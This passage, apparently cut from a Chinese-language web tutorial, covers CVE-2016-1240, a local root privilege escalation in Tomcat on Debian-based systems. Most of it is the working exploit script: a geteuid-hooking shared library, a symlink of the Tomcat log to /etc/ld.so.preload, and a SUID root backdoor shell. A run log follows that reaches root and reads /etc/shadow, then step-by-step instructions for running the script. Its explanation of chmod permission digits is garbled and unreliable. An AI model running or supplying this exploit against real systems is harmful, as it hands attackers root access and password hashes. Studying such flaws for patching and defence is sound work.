class="cs9FB05234">echo -e &quot;\n[+] Compiling the privesc shared library ($PRIVESCSRC)&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">cat &lt;&lt;_solibeof_&gt;$PRIVESCSRC</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#define _GNU_SOURCE</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#include &lt;stdio.h&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#include &lt;sys/stat.h&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#include &lt;unistd.h&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#include &lt;dlfcn.h&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">uid_t geteuid(void) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;static uid_t &nbsp;(*old_geteuid)();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;old_geteuid = dlsym(RTLD_NEXT, &quot;geteuid&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if ( old_geteuid() == 0 ) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chown(&quot;$BACKDOORPATH&quot;, 0, 0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chmod(&quot;$BACKDOORPATH&quot;, 04777);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unlink(&quot;/etc/ld.so.preload&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return old_geteuid();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">_solibeof_</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if [ $? -ne 0 ]; then</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo -e &quot;\n[!] Failed to compile the privesc lib $PRIVESCSRC.&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;cleanexit 2;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">fi</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Prepare backdoor shell</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">cp $BACKDOORSH $BACKDOORPATH</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo -e &quot;\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Safety check</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if [ -f /etc/ld.so.preload ]; then</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo -e &quot;\n[!] /etc/ld.so.preload already exists. Exiting for safety.&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;cleanexit 2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">fi</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Symlink the log file to ld.so.preload</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">rm -f $TOMCATLOG &amp;&amp; ln -s /etc/ld.so.preload $TOMCATLOG</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if [ $? -ne 0 ]; then</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo -e &quot;\n[!] Couldn&#39;t remove the $TOMCATLOG file or create a symlink.&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;cleanexit 3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">fi</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo -e &quot;\n[+] Symlink created at: \n`ls -l $TOMCATLOG`&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Wait for Tomcat to re-open the logs</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo -ne &quot;\n[+] Waiting for Tomcat to re-open the logs/Tomcat service restart...&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo -e &nbsp;&quot;\nYou could speed things up by executing : kill [Tomcat-pid] (as tomcat user) if needed ;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">while :; do </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sleep 0.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if [ -f /etc/ld.so.preload ]; then</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo $PRIVESCLIB &gt; /etc/ld.so.preload</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fi</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">done</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># /etc/ld.so.preload file should be owned by tomcat user at this point</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Inject the privesc.so shared library to escalate privileges</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo $PRIVESCLIB &gt; /etc/ld.so.preload</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo -e &quot;\n[+] Tomcat restarted. The /etc/ld.so.preload file got created with tomcat privileges: \n`ls -l /etc/ld.so.preload`&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo -e &quot;\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo -e &quot;\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo -e &quot;\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sudo --help 2&gt;/dev/null &gt;/dev/null</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Check for the rootshell</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ls -l $BACKDOORPATH | grep rws | grep -q root</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if [ $? -eq 0 ]; then </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo -e &quot;\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo -e &quot;\n\033[94mPlease tell me you&#39;re seeing this too ;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;\033[0m&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">else</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo -e &quot;\n[!] Failed to get root&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;cleanexit 2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">fi</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Execute the rootshell</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo -e &quot;\n[+] Executing the rootshell $BACKDOORPATH now! \n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$BACKDOORPATH -p -c &quot;rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$BACKDOORPATH -p</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Job done.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">cleanexit 0</span></p><h4 class="cs868C439D">
			<a name="poc运行示例："><span class="csBF12A472">poc</span><span class="cs6EDCDAE2">运行示例：</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">tomcat7@ubuntu:/tmp$ id</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">uid=110(tomcat7) gid=118(tomcat7) groups=118(tomcat7)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">tomcat7@ubuntu:/tmp$ lsb_release -a</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">No LSB modules are available.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Distributor ID: &nbsp;&nbsp;&nbsp;Ubuntu</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Description: &nbsp;&nbsp;&nbsp;Ubuntu 16.04 LTS</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Release: &nbsp;&nbsp;&nbsp;16.04</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Codename: &nbsp;&nbsp;&nbsp;xenial</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">tomcat7@ubuntu:/tmp$ dpkg -l | grep tomcat</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ii &nbsp;libtomcat7-java &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;7.0.68-1ubuntu0.1 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;all &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Servlet and JSP engine -- core libraries</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ii &nbsp;tomcat7 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;7.0.68-1ubuntu0.1 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;all &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Servlet and JSP engine</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ii &nbsp;tomcat7-common &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;7.0.68-1ubuntu0.1 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;all &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Servlet and JSP engine -- common files</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">tomcat7@ubuntu:/tmp$ ./tomcat-rootprivesc-deb.sh /var/log/tomcat7/catalina.out </span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">Tomcat 6/7/8 on Debian-based distros - Local Root Privilege Escalation Exploit</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">CVE-2016-1240</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">Discovered and coded by: </span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">Dawid Golunski </span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">http://legalhackers.com</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">[+] Starting the exploit in [active] mode with the following privileges: </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">uid=110(tomcat7) gid=118(tomcat7) groups=118(tomcat7)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">[+] Target Tomcat log file set to /var/log/tomcat7/catalina.out</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">[+] Compiling the privesc shared library (/tmp/privesclib.c)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">[+] Backdoor/low-priv shell installed at: </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">-rwxr-xr-x 1 tomcat7 tomcat7 1037464 Sep 30 22:27 /tmp/tomcatrootsh</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">[+] Symlink created at: </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">lrwxrwxrwx 1 tomcat7 tomcat7 18 Sep 30 22:27 /var/log/tomcat7/catalina.out -&gt; /etc/ld.so.preload</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">[+] Waiting for Tomcat to re-open the logs/Tomcat service restart...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">You could speed things up by executing : kill [Tomcat-pid] (as tomcat user) if needed ;)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">[+] Tomcat restarted. The /etc/ld.so.preload file got created with tomcat privileges: </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">-rw-r--r-- 1 tomcat7 root 19 Sep 30 22:28 /etc/ld.so.preload</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">[+] Adding /tmp/privesclib.so shared lib to /etc/ld.so.preload</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">[+] The /etc/ld.so.preload file now contains: </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/tmp/privesclib.so</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">[+] Escalating privileges via the /usr/bin/sudo SUID binary to get root!</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">[+] Rootshell got assigned root SUID perms at: </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">-rwsrwxrwx 1 root root 1037464 Sep 30 22:27 /tmp/tomcatrootsh</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">Please tell me you&#39;re seeing this too ;)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">[+] Executing the rootshell /tmp/tomcatrootsh now! </span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">tomcatrootsh-4.3# id</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">uid=110(tomcat7) gid=118(tomcat7) euid=0(root) groups=118(tomcat7)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">tomcatrootsh-4.3# whoami</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">root</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">tomcatrootsh-4.3# head -n3 /etc/shadow</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">root:$6$oaf[cut]:16912:0:99999:7:::</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">daemon:*:16912:0:99999:7:::</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">bin:*:16912:0:99999:7:::</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">tomcatrootsh-4.3# exit</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">exit</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">首先我们下载</span><span class="cs8926E06">poc</span><span class="cs9C1B1871">文件，然后执行命令</span><span class="cs9FB05234">cd /tmp</span><span class="cs9C1B1871">进入目录</span><span class="cs8926E06">,</span><span class="cs9C1B1871">然后编辑文件</span><span class="cs9FB05234">vim poc.sh</span><span class="cs9C1B1871">。将桌面的</span><span class="cs8926E06">poc.sh</span><span class="cs9C1B1871">使用</span><span class="cs8926E06">Notepad++</span><span class="cs9C1B1871">打开，将文件内容粘贴进去。然后按键盘</span><span class="cs8926E06">Esc</span><span class="cs9C1B1871">键，再输入</span><span class="cs9FB05234">:wq</span><span class="cs9C1B1871">，之后按</span><span class="cs8926E06"> Enter </span><span class="cs9C1B1871">键将文件保存。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">如果无法写入文件，使用命令</span></p><p class="cs3A447A38"><span class="cs9FB05234">chmod 755 poc.sh</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">执行命令后，再次重复上一步即可，</span><span class="cs8926E06">chmod</span><span class="cs9C1B1871">的意思是改变文件的权限，</span><span class="cs8926E06">775</span><span class="cs9C1B1871">是什么权限呢？第一个数字代表文件所属者的权限，第二个数字代表文件所属者所在组的权限，第三个数字代表其它用户的权限，</span><span class="cs8926E06">7=4+2+1</span></p><p class="cs6FD73CFB"><span class="cs8926E06">4</span><span class="cs9C1B1871">：执行时设置用户</span><span class="cs8926E06">ID</span><span class="cs9C1B1871">，用于授权给基于文件属主的进程，而不是给创建此进程的用户。</span><span class="cs8926E06"> 2</span><span class="cs9C1B1871">：执行时设置用户组</span><span class="cs8926E06">ID</span><span class="cs9C1B1871">，用于授权给基于文件所在组的进程，而不是基于创建此进程的用户。</span><span class="cs8926E06"> 1</span><span class="cs9C1B1871">：设置粘着位。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%ef%bc%88CVE-2016-1240%ef%bc%89Tomcat%e6%9c%ac%e5%9c%b0%e6%8f%90%e6%9d%83%e6%bc%8f%e6%b4%9e_files/image4.gif" width="560" height="356" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这时，</span><span class="cs8926E06">poc</span><span class="cs9C1B1871">文件就已经构造好了，接下来运行脚本运行命令为：</span></p><p class="cs3A447A38"><span class="cs9FB05234">./poc.sh /var/log/tomcat7/catalina.out</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">运行之后，会出现卡顿现象，这时候我们切换到</span><span class="cs8926E06">root</span><span class="cs9C1B1871">用户，重新启动</span><span class="cs8926E06">Tomcat7</span><span class="cs9C1B1871">，这时候使用命令</span><span class="cs9FB05234">whoami</span><span class="cs9C1B1871">查看当前用户，这时候已经是</span><span class="cs8926E06"> root </span><span class="cs9C1B1871">用户了，这时候就提权成功了</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%ef%bc%88CVE-2016-1240%ef%bc%89Tomcat%e6%9c%ac%e5%9c%b0%e6%8f%90%e6%9d%83%e6%bc%8f%e6%b4%9e_files/image5.gif" width="560" height="377" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以看到，命令提示符的开头为</span><span class="cs9FB05234">tomcat</span><span class="cs9C1B1871">低权限用户，而我们执行</span><span class="cs8926E06">whoami</span><span class="cs9C1B1871">命令的时候，显示的权限却是</span><span class="cs8926E06">root</span><span class="cs9C1B1871">，这样就成功的提权了。</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06"><a class="cs508254C" href="https://www.jianshu.com/p/94e4feac245f"><span class="cs4B51D5E4">https://www.jianshu.com/p/94e4feac245f</span></a></span></p></body>
</html>
